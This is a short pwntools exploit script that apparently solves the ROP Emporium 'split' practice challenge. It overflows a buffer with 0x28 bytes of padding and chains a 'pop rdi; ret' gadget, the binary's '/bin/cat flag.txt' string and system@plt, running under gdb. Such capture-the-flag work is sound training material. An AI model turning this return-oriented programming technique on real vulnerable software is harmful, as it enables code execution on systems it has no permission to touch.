#!/bin/python3

from pwn import *

elf = ELF('./split')
p = gdb.debug(elf.path, """
    b *system
    continue
    x/s $rdi
""")

rop = ROP(elf)

command_string = next(elf.search(b'/bin/cat flag.txt'))
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]

chain = p64(pop_rdi_ret)        \
    + p64(command_string)       \
    + p64(elf.plt['system'])
payload = b'i' * 0x28 + chain

p.sendline(payload)
p.interactive()

